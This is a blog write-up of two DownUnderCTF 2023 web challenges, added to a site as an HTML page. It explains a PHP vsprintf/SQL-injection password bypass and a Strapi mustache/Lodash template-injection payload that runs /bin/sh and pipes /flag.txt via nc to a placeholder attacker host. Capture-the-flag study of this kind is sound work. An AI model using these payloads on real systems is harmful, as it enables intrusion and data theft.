@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Smooth JazzSource Code123456789101112131415161718192021222324252627282930&lt;?phpfunction mysql_fquery($mysqli, $query, $params) &#123;  return mysqli_query($mysqli, vsprintf($query, $params));&#125;i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="downunderctf 2023-Writeup">
+<meta property="og:url" content="https://blog.2h0ng.wiki/2023/09/03/downunderctf-2023/index.html">
+<meta property="og:site_name" content="Zhong&#39;s Blog">
+<meta property="og:description" content="Smooth JazzSource Code123456789101112131415161718192021222324252627282930&lt;?phpfunction mysql_fquery($mysqli, $query, $params) &#123;  return mysqli_query($mysqli, vsprintf($query, $params));&#125;i">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://api.2h0ng.wiki/noteimages/2023/09/02/image-20230902190236092.png">
+<meta property="og:image" content="https://api.2h0ng.wiki/noteimages/2023/09/02/image-20230902190324305.png">
+<meta property="article:published_time" content="2023-09-03T21:24:33.000Z">
+<meta property="article:modified_time" content="2024-01-21T23:32:57.318Z">
+<meta property="article:author" content="2h0ng, Zhong">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://api.2h0ng.wiki/noteimages/2023/09/02/image-20230902190236092.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>downunderctf 2023-Writeup</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-JRNNF9TMHE"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-JRNNF9TMHE');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/superboy-zjc">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/09/09/PatriotCTF-2023/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/08/27/SeKaiCTF-2023/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.2h0ng.wiki/2023/09/03/downunderctf-2023/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.2h0ng.wiki/2023/09/03/downunderctf-2023/&text=downunderctf 2023-Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.2h0ng.wiki/2023/09/03/downunderctf-2023/&title=downunderctf 2023-Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.2h0ng.wiki/2023/09/03/downunderctf-2023/&is_video=false&description=downunderctf 2023-Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=downunderctf 2023-Writeup&body=Check out this article: https://blog.2h0ng.wiki/2023/09/03/downunderctf-2023/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.2h0ng.wiki/2023/09/03/downunderctf-2023/&title=downunderctf 2023-Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.2h0ng.wiki/2023/09/03/downunderctf-2023/&title=downunderctf 2023-Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.2h0ng.wiki/2023/09/03/downunderctf-2023/&title=downunderctf 2023-Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.2h0ng.wiki/2023/09/03/downunderctf-2023/&title=downunderctf 2023-Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.2h0ng.wiki/2023/09/03/downunderctf-2023/&name=downunderctf 2023-Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.2h0ng.wiki/2023/09/03/downunderctf-2023/&t=downunderctf 2023-Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Smooth-Jazz"><span class="toc-number">1.</span> <span class="toc-text">Smooth Jazz</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Source-Code"><span class="toc-number">1.1.</span> <span class="toc-text">Source Code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Prerequisite-knowledge"><span class="toc-number">1.2.</span> <span class="toc-text">Prerequisite knowledge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload-Example"><span class="toc-number">1.3.</span> <span class="toc-text">Payload Example</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Strapi-In"><span class="toc-number">2.</span> <span class="toc-text">Strapi In</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mustache-template-with-Lodash-SSTI-payloads"><span class="toc-number">2.1.</span> <span class="toc-text">mustache template with Lodash SSTI payloads</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">2.2.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        downunderctf 2023-Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">2h0ng, Zhong</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-09-03T21:24:33.000Z" class="dt-published" itemprop="datePublished">2023-09-03</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/ctf/" rel="tag">ctf</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Smooth-Jazz"><a href="#Smooth-Jazz" class="headerlink" title="Smooth Jazz"></a><strong>Smooth Jazz</strong></h1><h2 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a><strong>Source Code</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysql_fquery</span>(<span class="params"><span class="variable">$mysqli</span>, <span class="variable">$query</span>, <span class="variable">$params</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$mysqli</span>, <span class="title function_ invoke__">vsprintf</span>(<span class="variable">$query</span>, <span class="variable">$params</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$mysqli</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&#x27;db&#x27;</span>, <span class="string">&#x27;challuser&#x27;</span>, <span class="string">&#x27;challpass&#x27;</span>, <span class="string">&#x27;challenge&#x27;</span>);</span><br><span class="line">  <span class="variable">$username</span> = <span class="title function_ invoke__">strtr</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], [<span class="string">&#x27;&quot;&#x27;</span> =&gt; <span class="string">&#x27;\\&quot;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span> =&gt; <span class="string">&#x27;\\\\&#x27;</span>]);</span><br><span class="line">  <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_fquery</span>(<span class="variable">$mysqli</span>, <span class="string">&#x27;SELECT * FROM users WHERE username = &quot;%s&quot;&#x27;</span>, [<span class="variable">$username</span>]);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$res</span>)) &#123;</span><br><span class="line">     <span class="variable">$message</span> = <span class="string">&quot;Username not found.&quot;</span>;</span><br><span class="line">     <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_fquery</span>(<span class="variable">$mysqli</span>, <span class="string">&#x27;SELECT * FROM users WHERE username = &quot;&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;&quot; AND password = &quot;%s&quot;&#x27;</span>, [<span class="variable">$password</span>]);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$res</span>)) &#123;</span><br><span class="line">     <span class="variable">$message</span> = <span class="string">&quot;Invalid password.&quot;</span>;</span><br><span class="line">     <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$htmlsafe_username</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$username</span>, ENT_COMPAT | ENT_SUBSTITUTE);</span><br><span class="line">  <span class="variable">$greeting</span> = <span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> </span><br><span class="line">      ? <span class="string">&quot;Hello <span class="subst">$htmlsafe_username</span>, the server time is %s and the flag is %s&quot;</span></span><br><span class="line">      : <span class="string">&quot;Hello <span class="subst">$htmlsafe_username</span>, the server time is %s&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$message</span> = <span class="title function_ invoke__">vsprintf</span>(<span class="variable">$greeting</span>, [<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>), <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>)]);</span><br><span class="line">  </span><br><span class="line">  fail:</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Prerequisite-knowledge"><a href="#Prerequisite-knowledge" class="headerlink" title="Prerequisite knowledge"></a><strong>Prerequisite knowledge</strong></h2><ul>
+<li>Mysql engine <strong>truncates</strong> string from the beginning of an invalid UTF8-encoding character.</li>
+<li>Familiarity with the <strong>format</strong> parameter and the behavior of the <strong>vsprintf</strong> function in PHP.<ul>
+<li><code>vsprintf(string $format, mixed ...$values): string</code><ul>
+<li><strong>Format parameter</strong>:<ul>
+<li><code>%[argnum$][flags][width][.precision][specifier]</code><ul>
+<li><p>Example: <code>%1$&#39;as</code></p>
+<blockquote>
+<p>%: starting symbol</p>
+<p><strong>1$</strong>: [argnums$] :match the first value from values that are passed in.</p>
+<p><strong>‘a</strong>: one option of the [flags] -&gt; ‘(char): Replace blank with ‘a’ to pad the result string. For example, when [width] is set to 100 and the real length of the formatting string is only 5, the rest of the 95 characters would be padded with the letter ‘a’.</p>
+<p><strong>s</strong>: [specifier]: specify the data type for each data from inputted values. <code>%</code> is also a specifier, used for output real <code>%</code>, which is a tricky one for smuggling a new token by combining it with the <strong>htmlspecialchars</strong> function.</p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="Payload-Example"><a href="#Payload-Example" class="headerlink" title="Payload Example"></a><strong>Payload Example</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /username=admin%ff%251$c%23+%251$&#x27;&gt;%25s&amp;password=668</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><strong>%ff</strong>: This truncates the string after “admin”. From the MySQL engine’s perspective, the input characters are interpreted as “admin”.</p>
+</li>
+<li><p><strong>%251$c</strong>(after URL decoding becomes <strong>%1$c</strong>): This positional specifier manipulates the sprintf function to format the string as desired. In other words, it controls the real transfer stream and achieves our expectations by combining with the password value.</p>
+<p>  The reason we can’t use %c directly to format the password field is that string formatting typically proceeds in order. It maps each item of an input array to its respective position as defined by the specifiers. So we need to specify which data to render, avoiding the error.</p>
+<blockquote>
+<p>PHP Fatal error:  Uncaught ValueError: The arguments array must contain 2 items, 1 given in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php:3\nStack trace:\n#0 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php(3): vsprintf()</p>
+</blockquote>
+</li>
+<li><p><strong>password&#x3D;668</strong>: The SHA1 of 668 is 34cXXXXX. %34 represents a URL-encoded <strong>double-quote</strong>. Using vsprintf(“%1$c”, 34) generates a double-quote, exploiting SQL Injection to bypass password authentication.</p>
+</li>
+<li><p><strong>%251$’&gt;%25s</strong> (URL DECODING)-&gt; <strong>%1$’&gt;%s</strong>: the last step to do is get flag. Although we can not make the username totally match “admin”, we can inject a specifier as above to exfiltrate the second ‘FLAG’ formatting input.</p>
+</li>
+<li><p>To that end, there is a problem emerging. We can not pass two specifiers into the username field, since the previous vsprintf functions all only accept one input value. This means that directly passing two specifiers will cause an error in the PHP interpreter, as previously discussed. So the key point is to leverage <code>htmlspecialchars</code> function to “create a specifier” for us. That is what this payload did.</p>
+</li>
+<li><p>%1$’&gt;%s –htmlspecialchars–&gt; %1$’&gt;%s</p>
+<ul>
+<li>The first specifier, <strong>%1$’&amp;g</strong>, represents a floating-point number taken from position 1, using ‘&amp;’ as the padding character.</li>
+<li>followed by the string “t;”</li>
+<li>The second specifier: <strong>%s</strong>: string taken from the 2nd position, that is where the FLAG is.</li>
+</ul>
+</li>
+<li><p>That is how we arrived there.</p>
+</li>
+</ul>
+<h1 id="Strapi-In"><a href="#Strapi-In" class="headerlink" title="Strapi In"></a><strong>Strapi In</strong></h1><blockquote>
+<p>Strapi In is a really fun one! Since the challenge is derived from a <strong>0-day vulnerability</strong>, I finished it myself 🤩 and successfully made a contribution to <a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a>, a well-known payloads project! 🥳</p>
+</blockquote>
+<p>Quick Write-up for STRAPI IN:</p>
+<p>Step 1: Create a custom template with a reference ID of 1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;x=Object&#125;&#125;&#123;&#123;w=a=new x&#125;&#125;&#123;&#123;w.type=&quot;pipe&quot;&#125;&#125;&#123;&#123;w.readable=1&#125;&#125;&#123;&#123;w.writable=1&#125;&#125;&#123;&#123;a.file=&quot;/bin/sh&quot;&#125;&#125;&#123;&#123;a.args=[&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;nc **YOUR_IP YOUR_PORT** &lt; /flag.txt&quot;]&#125;&#125;&#123;&#123;a.stdio=[w,w]&#125;&#125;&#123;&#123;process.binding(&quot;spawn_sync&quot;).spawn(a).output&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Step 2: Visit the url: <a target="_blank" rel="noopener" href="https://web-strapi-in-6a0f1abf2bf0cbc0.2023.ductf.dev/api/sendtestemail/1">https://web-strapi-in-6a0f1abf2bf0cbc0.2023.ductf.dev/api/sendtestemail/1</a></p>
+<p><strong>for debug tips</strong></p>
+<p><code>/opt/strapi-in/node_modules/strapi-plugin-email-designer/server/services/email.js:91:87</code></p>
+<p><img src="https://api.2h0ng.wiki/noteimages/2023/09/02/image-20230902190236092.png" alt="https://api.2h0ng.wiki:443/noteimages/2023/09/02/image-20230902190236092.png"></p>
+<p><img src="https://api.2h0ng.wiki/noteimages/2023/09/02/image-20230902190324305.png" alt="https://api.2h0ng.wiki:443/noteimages/2023/09/02/image-20230902190324305.png"></p>
+<h2 id="mustache-template-with-Lodash-SSTI-payloads"><a href="#mustache-template-with-Lodash-SSTI-payloads" class="headerlink" title="mustache template with Lodash SSTI payloads"></a><strong>mustache template with Lodash SSTI payloads</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;= _.VERSION &#125;&#125;&#123;&#123;= _.templateSettings.evaluate &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/janl/mustache.js">https://github.com/janl/mustache.js</a></p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a><strong>Reference</strong></h2><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.sprintf.php#Specifiers">https://www.php.net/manual/en/function.sprintf.php#Specifiers</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.htmlspecialchars.php">https://www.php.net/manual/en/function.htmlspecialchars.php</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/web/smooth-jazz/solve/solution.py">https://github.com/DownUnderCTF/Challenges_2023_Public&#x2F;blob&#x2F;main&#x2F;web&#x2F;smooth-jazz&#x2F;solve&#x2F;solution.py</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/lodash-_-template-method/">https://www.geeksforgeeks.org/lodash-_-template-method&#x2F;</a></p>
+<p><a target="_blank" rel="noopener" href="https://twitter.com/rootxharsh/status/1268181937127997446?lang=en">https://twitter.com/rootxharsh/status/1268181937127997446?lang=en</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.ghostccamm.com/blog/multi_strapi_vulns/">https://www.ghostccamm.com/blog/multi_strapi_vulns&#x2F;</a></p>
+<p><a target="_blank" rel="noopener" href="https://lodash.com/docs/4.17.15#templateSettings">https://lodash.com/docs/4.17.15#templateSettings</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/superboy-zjc">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Smooth-Jazz"><span class="toc-number">1.</span> <span class="toc-text">Smooth Jazz</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Source-Code"><span class="toc-number">1.1.</span> <span class="toc-text">Source Code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Prerequisite-knowledge"><span class="toc-number">1.2.</span> <span class="toc-text">Prerequisite knowledge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload-Example"><span class="toc-number">1.3.</span> <span class="toc-text">Payload Example</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Strapi-In"><span class="toc-number">2.</span> <span class="toc-text">Strapi In</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mustache-template-with-Lodash-SSTI-payloads"><span class="toc-number">2.1.</span> <span class="toc-text">mustache template with Lodash SSTI payloads</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">2.2.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.2h0ng.wiki/2023/09/03/downunderctf-2023/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.2h0ng.wiki/2023/09/03/downunderctf-2023/&text=downunderctf 2023-Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.2h0ng.wiki/2023/09/03/downunderctf-2023/&title=downunderctf 2023-Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.2h0ng.wiki/2023/09/03/downunderctf-2023/&is_video=false&description=downunderctf 2023-Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=downunderctf 2023-Writeup&body=Check out this article: https://blog.2h0ng.wiki/2023/09/03/downunderctf-2023/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.2h0ng.wiki/2023/09/03/downunderctf-2023/&title=downunderctf 2023-Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.2h0ng.wiki/2023/09/03/downunderctf-2023/&title=downunderctf 2023-Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.2h0ng.wiki/2023/09/03/downunderctf-2023/&title=downunderctf 2023-Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.2h0ng.wiki/2023/09/03/downunderctf-2023/&title=downunderctf 2023-Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.2h0ng.wiki/2023/09/03/downunderctf-2023/&name=downunderctf 2023-Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.2h0ng.wiki/2023/09/03/downunderctf-2023/&t=downunderctf 2023-Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    2h0ng, Zhong
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/superboy-zjc">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
